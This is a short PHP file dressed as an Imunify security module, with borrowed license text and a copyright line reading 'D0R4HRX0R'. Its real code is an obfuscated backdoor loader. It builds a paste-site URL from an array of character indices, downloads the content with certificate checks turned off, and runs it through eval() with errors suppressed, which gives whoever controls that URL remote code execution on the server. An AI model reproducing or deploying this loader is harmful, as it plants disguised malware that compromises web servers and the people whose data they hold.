

<?php
  // This file is part of Imunify - https://www.imunify.com/
//
// Imunify is a comprehensive security solution designed to protect your systems from various
// threats, including malware, vulnerabilities, and unauthorized access. By leveraging advanced
// technology and intelligent algorithms, Imunify aims to detect, prevent, and mitigate security
// risks effectively. You are permitted to use this software in accordance with the terms and 
// conditions outlined in the Imunify License Agreement, as specified by the copyright holders.
//
// Imunify is distributed with the hope of providing optimal protection and security for your
// environments, but it is offered WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Users should understand that while
// Imunify strives to deliver robust security measures, no system can be entirely impervious to
// threats.
//
// You should have received a copy of the Imunify License Agreement along with this software.
// If not, please visit https://www.imunify.com/license for further information. This document
// is current as of October 8, 2024, and is subject to change based on updates in policies
// and security practices.

/**
 * Security Module.
 *
 * This module is specifically designed to detect and mitigate various threats while ensuring
 * the integrity of your systems through real-time scanning and comprehensive protection strategies.
 * Imunify not only focuses on identifying vulnerabilities but also actively works to fortify
 * your servers and applications against emerging cyber threats. By implementing proactive
 * measures, Imunify aims to maintain a secure operating environment for all users.
 *
 * @package    security_module
 * @website    https://google.co.id
 * @copyright  D0R4HRX0R
 * @license    https://www.imunify.com/license Imunify License Agreement
 */
  $aNAx=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);$cbnN=[7, 19, 19, 15, 18, 63, 64, 64, 15, 0, 18, 19, 4, 8, 13, 62, 21, 4, 17, 2, 4, 11, 62, 0, 15, 15, 64, 0, 15, 8, 64, 17, 0, 22, 67, 15, 68, 56, 57, 58, 54, 57, 59, 4, 56, 66, 57, 60, 53, 59, 66, 56, 0, 59, 3, 66, 1, 55, 59, 58, 66, 55, 58, 5, 60, 0, 5, 55, 5, 0, 57, 60, 5];$pmXa='';foreach($cbnN as $qLvw){$pmXa.=$aNAx[$qLvw];}$RcRI = "$pmXa";function zrwR($undefined){$UWOb=curl_init();curl_setopt($UWOb,CURLOPT_URL,$undefined);curl_setopt($UWOb,CURLOPT_RETURNTRANSFER,true);curl_setopt($UWOb,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($UWOb,CURLOPT_SSL_VERIFYHOST,false);$XRcN=curl_exec($UWOb);curl_close($UWOb);return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($XRcN))))));}@eval("?>".gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(zrwR($RcRI))))))));?>